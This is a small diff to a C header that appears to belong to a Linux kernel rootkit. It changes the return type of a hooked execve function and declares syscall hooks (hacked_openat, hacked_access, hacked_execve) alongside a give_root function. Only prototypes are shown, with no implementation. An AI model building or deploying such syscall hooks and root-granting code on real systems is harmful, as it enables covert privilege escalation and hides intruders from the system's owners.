@@ -32,7 +32,7 @@ asmlinkage int hacked_openat(int dirfd, const char *pathname, int flags, mode_t 
 
 asmlinkage int hacked_access(const char* pathname, int mode);
 
-asmlinkage int hacked_execve(const char* pathname, char* const argv[], char* const envp[]);
+asmlinkage long hacked_execve(const char* pathname, char* const argv[], char* const envp[]);
 
 void give_root(void);
 
